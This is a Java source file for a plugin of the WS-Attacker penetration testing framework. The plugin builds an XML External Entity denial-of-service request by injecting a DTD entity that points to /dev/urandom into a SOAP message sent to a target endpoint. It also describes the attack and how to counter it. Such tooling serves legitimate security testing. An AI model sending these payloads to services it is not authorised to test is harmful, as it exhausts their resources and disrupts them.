/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;

import java.util.HashMap;
import java.util.Map;
import wsattacker.main.plugin.option.OptionSimpleVarchar;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;

public class XmlExternalEntity
    extends AbstractDosPlugin
{

    // Mandatory DOS-specific Attributes - Do NOT change!
    // <editor-fold defaultstate="collapsed" desc="Autogenerated Attributes">
    private static final long serialVersionUID = 1L;

    // </editor-fold>
    // Custom Attributes
    private OptionSimpleVarchar optionExternalEntity;

    @Override
    public void initializeDosPlugin()
    {
        initData();
        // Custom Initilisation
        optionExternalEntity =
            new OptionSimpleVarchar( "Path to resource", "\"/dev/urandom\"",
                                     "Be carefull with Linux/Windows/Mac system resource differences!", 400 );
        getPluginOptions().add( optionExternalEntity );

    }

    @Override
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition()
    {
        return OptionTextAreaSoapMessage.PayloadPosition.BODYLASTCHILDELEMENT;
    }

    public void initData()
    {
        setName( "XML External Entity Attack" );
        setDescription( "<html><p>This attack checks whether or not a Web service is vulnerable to the \"XML External Entity\" attack.</p>"
            + "<p>A vulnerable Web service runs out of resources when trying to resolve an external entity."
            + "Examples of external entities are:<ul>"
            + "<li>Large files from external servers. This will use up the bandwidth.</li>"
            + "<li>Local files e.g. /dev/random/ on a Linux machine</li></ul></p>"
            + "<p>The external entity is defined in the Document Type Definition (DTD)."
            + "A detailed description of the attack can be found on <a href=\"http://clawslab.nds.rub.de/wiki/index.php/XML_Remote_Entity_Expansion\">http://clawslab.nds.rub.de/wiki/index.php/XML_Remote_Entity_Expansion</a>.</p>"
            + "<p>The attack algorithm replaces the string $$PAYLOADATTR$$ in the SOAP message below "
            + "with an attribute that uses the entity that points to the external resource.</p>"
            + "<p>The placeholder $$PAYLOADATTR$$ can be set to any other position in the SOAP message</p>"
            + "<p>The default value for the external source paramter is /dev/null/ and will only work on Linux bases Web services.</p></html>" );
        setCountermeasures( "In order to counter the attack, the DTD-processing (Document Type Definitions) feature has to be disabled completly.\n"
            + "Apache Axis2 1.5.2 is e.g. known to be vulnerable to this attack. Current versions of Apache Axis2 are not vulnerable anymore" );
    }

    @Override
    public void createTamperedRequest()
    {

        // get Message
        String soapMessageFinal;
        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();

        // inset payload entity in envelope
        String attribute = "&attackEntity;";
        soapMessage = this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload( soapMessage, attribute );

        // prepend DTD to message
        StringBuilder sb = new StringBuilder();
        sb.append( "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" );
        sb.append( "<!DOCTYPE requestType [ <!ENTITY attackEntity SYSTEM " + optionExternalEntity.getValue() + ">]>" );
        sb.append( soapMessage );
        soapMessageFinal = sb.toString();

        // get HeaderFields from original request, if required add custom
        // headers - make sure to clone!
        Map<String, String> httpHeaderMap = new HashMap<String, String>();
        for ( Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet() )
        {
            httpHeaderMap.put( entry.getKey(), entry.getValue() );
        }
        httpHeaderMap.put( "Content-Type", "application/xml; charset=UTF-8" );

        // write payload and header to TamperedRequestObject
        this.setTamperedRequestObject( httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal );

    }
    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below!
    // ----------------------------------------------------------
}
